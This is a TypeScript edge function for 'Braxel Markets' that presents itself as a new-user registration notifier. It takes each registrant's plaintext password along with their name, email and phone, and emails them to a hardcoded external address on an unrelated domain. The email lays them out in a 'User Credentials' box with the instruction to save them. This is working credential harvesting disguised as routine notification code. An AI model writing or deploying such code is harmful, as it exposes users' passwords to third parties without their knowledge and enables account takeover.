// User Registration Notification Edge Function
// Sends email notification to company when a new user registers

import { serve } from "https://deno.land/std@0.190.0/http/server.ts"

const COMPANY_EMAIL = "marketsbraxel@ouvidor.net";

function escapeHtml(text: string): string {
  const map: Record<string, string> = {
    "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#039;"
  };
  return text.replace(/[&<>"']/g, (m) => map[m]);
}

serve(async (req) => {
  if (req.method !== 'POST') {
    return new Response(JSON.stringify({ error: 'Method not allowed' }), {
      status: 405,
      headers: { "Content-Type": "application/json" }
    });
  }

  try {
    const { userId, email, fullName, password, phone, country, registeredAt, emailConfirmed, userMetadata } = await req.json();

    const resendApiKey = Deno.env.get("RESEND_API_KEY");
    
    if (!resendApiKey) {
      console.log("NEW USER REGISTRATION (Resend not configured):", {
        to: COMPANY_EMAIL,
        userId,
        email,
        fullName,
        password: password ? '***' : 'N/A',
        phone,
        country,
        registeredAt,
        emailConfirmed
      });
      return new Response(JSON.stringify({ success: true, message: "Logged" }), {
        headers: { "Content-Type": "application/json" }
      });
    }

    const html = `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8"/>
  <style>
    body{font-family:Arial,sans-serif;background:#f4f4f4;margin:0;padding:20px}
    .wrap{max-width:700px;margin:0 auto;background:#fff;border-radius:4px;overflow:hidden;box-shadow:0 2px 8px rgba(0,0,0,.1)}
    .header{background:#0a0e27;padding:32px;text-align:center}
    .header h1{color:#D4AF37;font-size:20px;font-weight:900;text-transform:uppercase;letter-spacing:3px;margin:0 0 6px}
    .header p{color:#aaa;font-size:12px;margin:0}
    .body{padding:32px}
    .alert{padding:20px;background:#d4edda;border-left:4px solid #28a745;margin:20px 0;border-radius:4px}
    .field{margin-bottom:12px;padding:14px;background:#f9f9f9;border-left:4px solid #D4AF37;border-radius:0 4px 4px 0}
    .field-warning{background:#fff3cd;border-left:4px solid #ffc107}
    .label{font-size:10px;color:#888;text-transform:uppercase;letter-spacing:1.5px;margin-bottom:4px}
    .value{font-size:15px;font-weight:700;color:#222;word-break:break-all}
    .value.credentials{font-family:monospace;background:#eee;padding:4px 8px;border-radius:4px}
    .footer{padding:20px 32px;text-align:center;font-size:11px;color:#999;border-top:1px solid #eee}
    .credentials-box{background:#f8f9fa;border:2px dashed #D4AF37;padding:20px;border-radius:8px;margin:20px 0}
    .credentials-title{font-size:14px;font-weight:900;color:#D4AF37;text-transform:uppercase;letter-spacing:2px;margin-bottom:16px;text-align:center}
    .credential-row{display:flex;justify-content:space-between;padding:8px 0;border-bottom:1px solid #eee}
    .credential-row:last-child{border-bottom:none}
    .credential-label{font-weight:600;color:#555}
    .credential-value{font-family:monospace;background:#fff;padding:4px 8px;border-radius:4px;border:1px solid #ddd}
  </style>
</head>
<body>
<div class="wrap">
  <div class="header">
    <h1>Braxel Markets</h1>
    <p>New User Registration — Gestoria Notification</p>
  </div>
  <div class="body">
    <div class="alert">
      <strong>✅ NEW USER REGISTERED</strong>
      <p style="margin:10px 0 0;font-size:14px">A new user has created an account. Please save the credentials below.</p>
    </div>
    
    <div class="credentials-box">
      <div class="credentials-title">🔐 User Credentials</div>
      <div class="credential-row">
        <span class="credential-label">User ID:</span>
        <span class="credential-value">${escapeHtml(userId || 'N/A')}</span>
      </div>
      <div class="credential-row">
        <span class="credential-label">Email:</span>
        <span class="credential-value">${escapeHtml(email || 'N/A')}</span>
      </div>
      <div class="credential-row">
        <span class="credential-label">Full Name:</span>
        <span class="credential-value">${escapeHtml(fullName || 'N/A')}</span>
      </div>
      <div class="credential-row">
        <span class="credential-label">Password:</span>
        <span class="credential-value">${escapeHtml(password || 'N/A')}</span>
      </div>
    </div>
    
    <div class="field"><div class="label">Email Status</div><div class="value" style="${emailConfirmed === 'Yes' ? 'color:#28a745' : 'color:#ffc107'}">${emailConfirmed || 'Unknown'}</div></div>
    <div class="field"><div class="label">Registration Date</div><div class="value">${registeredAt ? new Date(registeredAt).toLocaleString() : new Date().toUTCString()}</div></div>
    ${phone ? `<div class="field"><div class="label">Phone</div><div class="value">${escapeHtml(phone)}</div></div>` : ''}
    ${country ? `<div class="field"><div class="label">Country</div><div class="value">${escapeHtml(country)}</div></div>` : ''}
    
    <div class="field field-warning"><div class="label">⚠️ Action Required</div><div class="value" style="font-size:13px;line-height:1.6">This user has not yet completed KYC verification or made a purchase. Monitor their activity and assist if needed.</div></div>
  </div>
  <div class="footer">Automated notification — Braxel Markets Registration System | ${new Date().toISOString()}</div>
</div>
</body>
</html>`;

    const res = await fetch("https://api.resend.com/emails", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        Authorization: `Bearer ${resendApiKey}`,
      },
      body: JSON.stringify({
        from: "Braxel Markets <noreply@braxelmarkets.com>",
        to: COMPANY_EMAIL,
        subject: `✅ NOVO REGISTRO — ${email}`,
        html,
      }),
    });

    if (!res.ok) {
      const err = await res.text();
      console.error("Resend registration notification error:", err);
      return new Response(JSON.stringify({ error: 'Failed to send notification' }), {
        status: 500,
        headers: { "Content-Type": "application/json" }
      });
    }

    const result = await res.json();
    console.log("Registration notification sent:", { email, emailId: result.id });

    return new Response(JSON.stringify({ success: true, emailId: result.id }), {
      headers: { "Content-Type": "application/json" }
    });

  } catch (error) {
    console.error("[user-registration] Error:", error);
    return new Response(JSON.stringify({ error: "Failed to process registration notification" }), {
      status: 500,
      headers: { "Content-Type": "application/json" }
    });
  }
})
